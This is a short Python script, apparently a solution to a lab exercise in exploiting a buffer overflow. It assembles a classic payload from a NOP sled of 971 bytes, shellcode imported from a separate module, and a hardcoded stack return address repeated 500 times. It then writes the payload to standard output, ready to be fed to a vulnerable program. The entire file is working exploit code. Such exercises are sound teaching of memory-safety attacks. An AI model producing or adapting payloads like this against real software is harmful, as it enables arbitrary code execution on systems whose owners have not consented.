import sys
from struct import pack
from shellcode import shellcode

addr = pack('<I', 0xfff6eb20 + 50)
slide = b'\x90'*971

# Implement your attack here!
payload = slide + shellcode  + addr * 500

# Launch the attack!
sys.stdout.buffer.write(payload)
